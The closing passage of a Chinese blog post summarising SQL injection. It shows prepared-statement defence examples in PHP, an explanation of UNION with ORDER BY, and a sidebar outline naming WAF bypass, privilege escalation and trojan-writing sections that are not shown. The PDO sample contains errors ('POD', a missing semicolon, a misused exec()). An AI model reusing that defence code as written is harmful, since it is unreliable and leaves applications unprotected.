class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户ID："</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户名："</span>.$row[<span class="string">'username'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"用户密码："</span>.$row[<span class="string">'password'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">mysql_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PDO方式:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$pdo = <span class="keyword">new</span> POD(<span class="string">'mysql:dbname=test;host=127.0.0.1;charset=utf8'</span>,<span class="string">'user'</span>,<span class="string">'pass'</span>);</span><br><span class="line"></span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);</span><br><span class="line"></span><br><span class="line">$stmt = $pdo-&gt;prepare($sql=<span class="string">"SELECT * from users where name =?"</span>)</span><br><span class="line"></span><br><span class="line">$stmt-&gt;exec(<span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $name));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($stmt <span class="keyword">as</span> $row)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $id;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $info;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> \n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysqli</span></span><br><span class="line"></span><br><span class="line">$stmt = $dbConnection-&gt;prepare(<span class="string">'SELECT * FROM users WHERE name= ?'</span>);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;bind_param(<span class="string">'s'</span>,$name);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//do something</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>(3).强制类型转换</p>
<h3 id="0x17-几个脚本"><a href="#0x17-几个脚本" class="headerlink" title="0x17 几个脚本"></a>0x17 几个脚本</h3><hr>
<h3 id="0x18-附加问题"><a href="#0x18-附加问题" class="headerlink" title="0x18 附加问题"></a>0x18 附加问题</h3><hr>
<h4 id="为什么union和order-by不能同时使用？"><a href="#为什么union和order-by不能同时使用？" class="headerlink" title="为什么union和order by不能同时使用？"></a>为什么union和order by不能同时使用？</h4><p>如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&gt;9 order by 3 desc union select * from users where id&lt;4 order by 3 desc;</span><br><span class="line">ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY</span><br></pre></td></tr></table></figure>
<p>union和 order by 当然是可以同时存在的</p>
<p>但是在使用union的时候，联合查询不仅仅是将数据集合合并</p>
<p>他并不是将每个子查询一个一个查询出来后联接在一起，数据库是将整段查询语句理解之后统一查询得到的是整个的数据集合</p>
<p>另外order by在一个数据集合查询里也只能出现一次并且出现在最后。</p>
<p>因此，在联合查询里，order by 要写在最后一个子查询之后，并且，该排序是对整个联合查询出来的结果集排序的，并不是只对最后一个子查询排序</p>
<p>所以应该这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&gt;9 union select * from users where id&lt;4 order by 3 desc;</span><br></pre></td></tr></table></figure>
<p>这样就可以对我们联合查询出来的结果集进行整体排序，而不是只对最后一个子查询的结果集排序。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select * from [IND] where INDID=4</span><br><span class="line"></span><br><span class="line"> union</span><br><span class="line"></span><br><span class="line"> select * from [IND] where INDID=2</span><br><span class="line"></span><br><span class="line"> union</span><br><span class="line"></span><br><span class="line"> select * from [IND] where INDID=1</span><br><span class="line"></span><br><span class="line"> union</span><br><span class="line"></span><br><span class="line"> select * from [IND] where INDID=5</span><br><span class="line"></span><br><span class="line"> union</span><br><span class="line"></span><br><span class="line"> select * from [IND] where INDID=3</span><br></pre></td></tr></table></figure>
<p>INDID是主键，在创建数据的时候，数据库里的顺序是12345</p>
<p>如果联合查询只是但存的将查询结果联接在一起，那么我们得到的结果应该是：42153</p>
<p>但是，实际上得到的结果是和数据库里数据排列的顺序一样的 12345</p>
<p>因此，可以得出结论，联合查询的结果是整个查询完成后得出的，而不是将子查询挨个完成后拼接的。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/injection/" rel="tag"># injection</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/05/13/对于XXE的学习/" rel="next" title="对于XXE的学习">
                <i class="fa fa-chevron-left"></i> 对于XXE的学习
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/06/21/SCTF write up(部分)/" rel="prev" title="SCTF write up">
                SCTF write up <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Inhaltsverzeichnis
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Übersicht
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Ratten3anger</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">Artikel</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">Tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://Hu3sky.github.io" title="Hu3sky" target="_blank">Hu3sky</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://patrilic.github.io" title="Patrilic" target="_blank">Patrilic</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://we.cuit.site" title="Act0r" target="_blank">Act0r</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://zoniony.github.io" title="Zoniony" target="_blank">Zoniony</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sa1tfish.site" title="Ph3mf0lk" target="_blank">Ph3mf0lk</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一个详细的总结"><span class="nav-number">1.</span> <span class="nav-text">一个详细的总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-注入导图"><span class="nav-number">2.</span> <span class="nav-text">0x01 注入导图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-基于有正确回显的注入"><span class="nav-number">3.</span> <span class="nav-text">0x02 基于有正确回显的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-判断注入点"><span class="nav-number">3.1.</span> <span class="nav-text">1.判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-测试是否存在过滤及绕过"><span class="nav-number">3.2.</span> <span class="nav-text">2.测试是否存在过滤及绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-猜字段数"><span class="nav-number">3.3.</span> <span class="nav-text">3.猜字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-order-by"><span class="nav-number">3.3.1.</span> <span class="nav-text">(1).order by</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-select-into"><span class="nav-number">3.3.2.</span> <span class="nav-text">(2).select into</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-联合查询"><span class="nav-number">3.4.</span> <span class="nav-text">4.联合查询:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-基于报错的注入"><span class="nav-number">4.</span> <span class="nav-text">0x03 基于报错的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-几个函数"><span class="nav-number">4.1.</span> <span class="nav-text">1.几个函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-原理"><span class="nav-number">4.2.</span> <span class="nav-text">2.原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-栗子"><span class="nav-number">4.3.</span> <span class="nav-text">3.栗子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-另外九种报错方式"><span class="nav-number">4.4.</span> <span class="nav-text">4.另外九种报错方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-extractvalue"><span class="nav-number">4.4.1.</span> <span class="nav-text">1.extractvalue()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-updataxml"><span class="nav-number">4.4.2.</span> <span class="nav-text">2.updataxml()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-geometrycollection"><span class="nav-number">4.4.3.</span> <span class="nav-text">3.geometrycollection()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-multipoint"><span class="nav-number">4.5.</span> <span class="nav-text">4.multipoint()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#5-polygon-polygon-六边形-，几何图形的函数"><span class="nav-number">4.5.1.</span> <span class="nav-text">5.polygon()        //polygon(六边形)，几何图形的函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-multipolygon-两个六边形进行几何运算"><span class="nav-number">4.5.2.</span> <span class="nav-text">6.multipolygon()        //两个六边形进行几何运算</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-linestring"><span class="nav-number">4.5.3.</span> <span class="nav-text">7.linestring()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-multilinestring"><span class="nav-number">4.5.4.</span> <span class="nav-text">8.multilinestring()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-exp"><span class="nav-number">4.5.5.</span> <span class="nav-text">9.exp()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-使用insert、update、delect进行注入"><span class="nav-number">5.</span> <span class="nav-text">0x04 使用insert、update、delect进行注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-以updatexml-为例"><span class="nav-number">5.1.</span> <span class="nav-text">1.以updatexml()为例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-利用name-const-获取数据"><span class="nav-number">5.2.</span> <span class="nav-text">2.利用name_const()获取数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-更多闭合变种："><span class="nav-number">5.3.</span> <span class="nav-text">3.更多闭合变种：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-几何函数"><span class="nav-number">5.4.</span> <span class="nav-text">4.几何函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-procedure-analyse"><span class="nav-number">5.4.1.</span> <span class="nav-text">1.procedure analyse()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-using-name-const"><span class="nav-number">5.4.2.</span> <span class="nav-text">2.using name_const():</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#boolean型报错注入"><span class="nav-number">5.4.3.</span> <span class="nav-text">boolean型报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#转移报错"><span class="nav-number">5.4.4.</span> <span class="nav-text">转移报错</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错原理之深入研究"><span class="nav-number">5.5.</span> <span class="nav-text">报错原理之深入研究</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-基于文件读写权限的注入"><span class="nav-number">6.</span> <span class="nav-text">0x05 基于文件读写权限的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-条件"><span class="nav-number">6.1.</span> <span class="nav-text">1.条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-一些函数"><span class="nav-number">6.2.</span> <span class="nav-text">2.一些函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-演示"><span class="nav-number">6.3.</span> <span class="nav-text">3.演示:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-实际"><span class="nav-number">6.4.</span> <span class="nav-text">4.实际:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-区别"><span class="nav-number">6.5.</span> <span class="nav-text">5.区别:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-盲注"><span class="nav-number">7.</span> <span class="nav-text">0x06 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-相关函数："><span class="nav-number">7.1.</span> <span class="nav-text">1.相关函数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-布尔型盲注："><span class="nav-number">7.2.</span> <span class="nav-text">2.布尔型盲注：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-时间型盲注实际操作："><span class="nav-number">7.3.</span> <span class="nav-text">3.时间型盲注实际操作：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-关于盲注的更多扩展："><span class="nav-number">7.4.</span> <span class="nav-text">3.关于盲注的更多扩展：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-不同的时间盲注的五种方法"><span class="nav-number">7.5.</span> <span class="nav-text">4.不同的时间盲注的五种方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-sleep"><span class="nav-number">7.5.1.</span> <span class="nav-text">(1).sleep()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-benchmark"><span class="nav-number">7.5.2.</span> <span class="nav-text">(2).benchmark()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-笛卡儿积"><span class="nav-number">7.5.3.</span> <span class="nav-text">(3).笛卡儿积</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-GET-LOCK"><span class="nav-number">7.5.4.</span> <span class="nav-text">(4).GET_LOCK</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-RLIKE"><span class="nav-number">7.5.5.</span> <span class="nav-text">(5).RLIKE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-外带通道注入"><span class="nav-number">8.</span> <span class="nav-text">0x07 外带通道注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-SMB-Relay注入攻击"><span class="nav-number">9.</span> <span class="nav-text">0x08 SMB Relay注入攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-order-by注入"><span class="nav-number">10.</span> <span class="nav-text">0x09 order by注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入"><span class="nav-number">10.1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注"><span class="nav-number">10.2.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#改变返回数据"><span class="nav-number">10.3.</span> <span class="nav-text">改变返回数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-limit注入"><span class="nav-number">11.</span> <span class="nav-text">0x10 limit注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-可以使用union-select"><span class="nav-number">11.1.</span> <span class="nav-text">1.可以使用union select</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-报错注入"><span class="nav-number">11.2.</span> <span class="nav-text">2.报错注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-提权"><span class="nav-number">12.</span> <span class="nav-text">0x11 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#上传udf-dll"><span class="nav-number">12.1.</span> <span class="nav-text">上传udf.dll</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#添加函数"><span class="nav-number">12.2.</span> <span class="nav-text">添加函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#root权限写木马"><span class="nav-number">12.3.</span> <span class="nav-text">root权限写木马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权姿势"><span class="nav-number">12.4.</span> <span class="nav-text">提权姿势</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x12-移位溢注技术"><span class="nav-number">13.</span> <span class="nav-text">0x12 移位溢注技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x13-特别报错"><span class="nav-number">14.</span> <span class="nav-text">0x13 特别报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x14-简单绕过技巧"><span class="nav-number">15.</span> <span class="nav-text">0x14 简单绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-注释符："><span class="nav-number">15.1.</span> <span class="nav-text">1.注释符：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-前缀："><span class="nav-number">15.2.</span> <span class="nav-text">2.前缀：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-运算符："><span class="nav-number">15.3.</span> <span class="nav-text">3.运算符：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-空格"><span class="nav-number">15.4.</span> <span class="nav-text">4.空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-不用逗号"><span class="nav-number">15.5.</span> <span class="nav-text">5.不用逗号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-不用引号"><span class="nav-number">15.6.</span> <span class="nav-text">6.不用引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-过滤where"><span class="nav-number">15.7.</span> <span class="nav-text">7.过滤where</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-过滤having"><span class="nav-number">15.8.</span> <span class="nav-text">8.过滤having</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-过滤substr、substring"><span class="nav-number">15.9.</span> <span class="nav-text">9.过滤substr、substring</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-类型转换"><span class="nav-number">15.10.</span> <span class="nav-text">10.类型转换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x14-对waf的深入研究与绕过"><span class="nav-number">16.</span> <span class="nav-text">0x14 对waf的深入研究与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-关键字过滤"><span class="nav-number">16.1.</span> <span class="nav-text">1.关键字过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x15-一些函数"><span class="nav-number">17.</span> <span class="nav-text">0x15 一些函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-有些函数有类似搜索匹配的功能"><span class="nav-number">17.1.</span> <span class="nav-text">1.有些函数有类似搜索匹配的功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-使用函数进行字符串的切割"><span class="nav-number">17.2.</span> <span class="nav-text">2.使用函数进行字符串的切割</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x16-从初级到高级的9类WAF绕过技巧"><span class="nav-number">18.</span> <span class="nav-text">0x16 从初级到高级的9类WAF绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-大小写绕过"><span class="nav-number">18.1.</span> <span class="nav-text">1.大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-关键字替换"><span class="nav-number">18.2.</span> <span class="nav-text">2.关键字替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-使用编码"><span class="nav-number">18.3.</span> <span class="nav-text">3.使用编码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-URL编码"><span class="nav-number">18.3.1.</span> <span class="nav-text">1.URL编码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-十六进制编码"><span class="nav-number">18.3.2.</span> <span class="nav-text">2.十六进制编码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Unicode编码"><span class="nav-number">18.3.3.</span> <span class="nav-text">3.Unicode编码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-使用注释"><span class="nav-number">18.3.4.</span> <span class="nav-text">4.使用注释</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-看一下常见的用于注释的符号有哪些"><span class="nav-number">18.3.4.1.</span> <span class="nav-text">1.看一下常见的用于注释的符号有哪些</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-内联注释"><span class="nav-number">18.3.4.2.</span> <span class="nav-text">2.内联注释</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-等价函数"><span class="nav-number">18.4.</span> <span class="nav-text">5.等价函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-特殊符号"><span class="nav-number">18.5.</span> <span class="nav-text">6.特殊符号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-关键字拆分"><span class="nav-number">18.6.</span> <span class="nav-text">7.关键字拆分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-HTTP参数控制"><span class="nav-number">18.7.</span> <span class="nav-text">8.HTTP参数控制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-HPP参数污染-HTTP-Parameter-Polution"><span class="nav-number">18.7.1.</span> <span class="nav-text">1.HPP参数污染(HTTP Parameter Polution)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-HPF-HTTP-Parameter-Fragment"><span class="nav-number">18.7.2.</span> <span class="nav-text">2.HPF(HTTP Parameter Fragment)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-HPC-HTTP-Parameter-Contamination"><span class="nav-number">18.7.3.</span> <span class="nav-text">3.HPC(HTTP Parameter Contamination)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-缓冲区溢出"><span class="nav-number">18.8.</span> <span class="nav-text">9.缓冲区溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-整合绕过"><span class="nav-number">18.9.</span> <span class="nav-text">10.整合绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x16-防御方法"><span class="nav-number">19.</span> <span class="nav-text">0x16 防御方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-传统方法"><span class="nav-number">19.1.</span> <span class="nav-text">1.传统方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-流行方法"><span class="nav-number">19.2.</span> <span class="nav-text">2.流行方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x17-几个脚本"><span class="nav-number">20.</span> <span class="nav-text">0x17 几个脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x18-附加问题"><span class="nav-number">21.</span> <span class="nav-text">0x18 附加问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么union和order-by不能同时使用？"><span class="nav-number">21.1.</span> <span class="nav-text">为什么union和order by不能同时使用？</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ratten3anger</span>

  
</div>


  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
